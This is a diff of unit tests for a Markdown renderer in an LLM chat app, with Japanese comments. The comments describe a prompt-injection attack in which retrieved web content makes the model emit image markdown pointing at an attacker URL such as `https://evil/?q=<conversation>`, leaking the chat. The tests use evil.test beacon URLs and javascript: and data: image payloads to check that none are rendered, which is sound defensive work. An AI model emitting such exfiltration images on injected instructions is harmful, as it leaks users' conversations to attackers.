@@ -87,6 +87,43 @@ describe("Markdown", () => {
     expect(html).toContain('target="_blank"');
   });
 
+  it("ページ内リンク (脚注など) は別タブで開かない", () => {
+    // remark-gfm の脚注は `#user-content-fn-1` を出す。これに target="_blank" が付くと
+    // 脚注を踏むたびに新しいタブが開く。
+    const html = render("本文[^1]\n\n[^1]: 注釈");
+    expect(html).toMatch(/<a href="#user-content-fn-1"(?![^>]*target=)/);
+  });
+
+  // --- 画像 ---------------------------------------------------------------
+  //
+  // **LLM が書いた画像は一切読み込まない。** これは LLM チャット UI の既知の攻撃で、
+  // 描画しただけで (クリック不要で) ブラウザが任意の外部 URL を取得しにいく。
+  //
+  // RAG は外部サイト (公式サイト・ブログ) から本文を取り込む。そこに仕込まれた
+  // プロンプトインジェクションが `![](https://evil/?q=会話の内容)` を出力させると、
+  // **会話内容が攻撃者のサーバへ流出する**。IP/UA の漏洩やトラッキングにも使える。
+  //
+  // このアプリに LLM が書いた画像を表示する正当な理由は無い
+  // (カード画像は自前 DB から別経路で出している)。
+
+  it("外部画像を読み込まない (プロンプトインジェクションによる情報漏洩の遮断)", () => {
+    const html = render("![盤面](https://evil.test/beacon.png?q=secret)");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.test");
+    // preload も出させない (Next が <link rel=preload as=image> を注入してしまう)
+    expect(html).not.toContain("preload");
+  });
+
+  it("画像の代替テキストは残す (情報を黙って捨てない)", () => {
+    const html = render("![カードの画像](https://evil.test/x.png)");
+    expect(html).toContain("カードの画像");
+  });
+
+  it("javascript: / data: の画像も当然出さない", () => {
+    expect(render("![x](javascript:alert(1))")).not.toContain("<img");
+    expect(render("![x](data:image/svg+xml;base64,PHN2Zz4=)")).not.toContain("<img");
+  });
+
   it("ストリーミング中の未閉じマークアップでも落ちない", () => {
     // token は1文字ずつ届くので、`**` が片方しか来ていない状態が必ず発生する。
     expect(() => render("**途中まで")).not.toThrow();
